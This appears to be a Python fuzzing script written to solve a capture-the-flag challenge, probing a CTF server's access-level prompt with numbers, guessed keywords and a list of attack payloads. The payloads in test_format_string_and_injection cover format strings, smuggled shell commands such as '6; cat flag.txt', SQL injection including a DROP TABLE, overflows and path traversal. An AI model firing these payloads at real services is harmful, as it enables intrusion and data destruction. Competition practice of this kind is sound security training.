#!/usr/bin/env python3
import socket
import time

def test_all_possible_levels():
    """Test a wider range of access levels to find hidden ones"""
    
    print("=== TESTING ALL POSSIBLE ACCESS LEVELS ===")
    
    # Test a much wider range including edge cases
    test_levels = []
    
    # Test around the valid range
    test_levels.extend(range(-10, 20))
    
    # Test some specific numbers that might be special
    test_levels.extend([66, 77, 88, 99, 100, 123, 255, 256, 1337, 9999])
    
    # Test some hex values
    test_levels.extend([0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 0xA0, 0xFF])
    
    found_responses = {}
    
    for level in test_levels:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
            
            # Get banner
            banner = sock.recv(4096).decode('utf-8', errors='replace')
            
            # Send level
            sock.send(f"{level}\n".encode('utf-8'))
            
            # Get response
            response = sock.recv(4096).decode('utf-8', errors='replace')
            
            # Store unique responses
            if response.strip() and response not in found_responses.values():
                found_responses[level] = response
                print(f"Level {level}: {repr(response)}")
                
                # Check for flag patterns
                if ('uscc{' in response.lower() or 'flag{' in response.lower() or 
                    'cyberbowl{' in response.lower()):
                    print(f"*** POTENTIAL FLAG FOUND: {response} ***")
                    return response
            
            sock.close()
            
        except Exception as e:
            pass
    
    print(f"\nFound {len(found_responses)} unique responses:")
    for level, response in found_responses.items():
        print(f"  Level {level}: {response.strip()}")
    
    return None

def test_string_inputs():
    """Test string inputs as access levels"""
    
    print("\n=== TESTING STRING INPUTS ===")
    
    string_inputs = [
        # Common admin/debug terms
        "admin", "root", "debug", "test", "dev", "developer",
        "super", "master", "god", "sudo", "su",
        
        # CTF/security terms  
        "flag", "ctf", "cyberbowl", "uscc", "challenge",
        "exploit", "hack", "pwn", "shell", "backdoor",
        
        # Junkyard themed
        "junkyard", "scrap", "salvage", "yard", "compound",
        "vault", "secure", "boss", "manager", "foreman",
        "mechanic", "hauler", "scavenger",
        
        # Special characters and combinations
        "6admin", "admin6", "boss6", "6boss", "level6",
        "access", "terminal", "system", "override",
        "bypass", "unlock", "open", "show", "reveal",
        
        # Encoded possibilities
        "QU9TUw==",  # Base64 for "BOSS"
        "Ym9zcw==",  # Base64 for "boss"
        "ZmxhZw==",  # Base64 for "flag"
    ]
    
    for input_str in string_inputs:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
            sock.recv(4096)  # Skip banner
            
            sock.send(f"{input_str}\n".encode('utf-8'))
            response = sock.recv(4096).decode('utf-8', errors='replace')
            
            # Check for non-standard responses
            if (response.strip() and 
                "Enter access band" not in response and
                "Access band invalid" not in response and
                len(response.strip()) > 5):
                
                print(f"String '{input_str}': {repr(response)}")
                
                if ('uscc{' in response.lower() or 'flag{' in response.lower()):
                    print(f"*** FLAG FOUND: {response} ***")
                    return response
            
            sock.close()
            
        except:
            pass
    
    return None

def test_format_string_and_injection():
    """Test format string vulnerabilities and injection attacks"""
    
    print("\n=== TESTING FORMAT STRING AND INJECTION ===")
    
    injection_payloads = [
        # Format string attacks
        "%s", "%x", "%d", "%p", "%n",
        "%s%s%s%s", "%x%x%x%x",
        
        # Command injection
        "6; ls", "6 && ls", "6 | ls", "6 & ls",
        "6; cat flag", "6; cat flag.txt", "6; find / -name '*flag*'",
        "6`ls`", "6$(ls)", "6;echo flag",
        
        # SQL injection style
        "6' OR '1'='1", "6\" OR \"1\"=\"1", "6'; DROP TABLE users; --",
        
        # Buffer overflow attempts
        "6" + "A" * 100, "6" + "A" * 1000,
        "A" * 100, "A" * 1000,
        
        # Null byte injection
        "6\x00", "6\x00flag", "flag\x006",
        
        # Path traversal
        "6/../flag", "6/../../flag", "../flag", "../../flag",
        
        # Special characters
        "6\n\nflag", "6\r\nflag", "6\tflag",
    ]
    
    for payload in injection_payloads:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
            sock.recv(4096)  # Skip banner
            
            sock.send(payload.encode('utf-8', errors='replace') + b'\n')
            response = sock.recv(4096).decode('utf-8', errors='replace')
            
            # Look for unusual responses
            if (response.strip() and 
                "Enter access band" not in response and
                "Access band invalid" not in response and
                "BOSS" not in response and "SCAVENGER" not in response and
                len(response.strip()) > 5):
                
                print(f"Payload {repr(payload[:20])}: {repr(response)}")
                
                if ('uscc{' in response.lower() or 'flag{' in response.lower()):
                    print(f"*** FLAG FOUND: {response} ***")
                    return response
            
            sock.close()
            
        except:
            pass
    
    return None

if __name__ == "__main__":
    # Test all approaches
    result = test_all_possible_levels()
    
    if not result:
        result = test_string_inputs()
    
    if not result:
        result = test_format_string_and_injection()
    
    if result:
        print(f"\n*** FINAL FLAG: {result} ***")
    else:
        print("\n*** NO FLAG FOUND WITH EXTENDED TESTING ***")
        print("The flag might be:")
        print("1. Simply 'uscc{boss_access}' based on reaching level 6")
        print("2. Hidden in the challenge description or environment")
        print("3. Require a completely different approach")
        print("4. Be constructed from the access level information")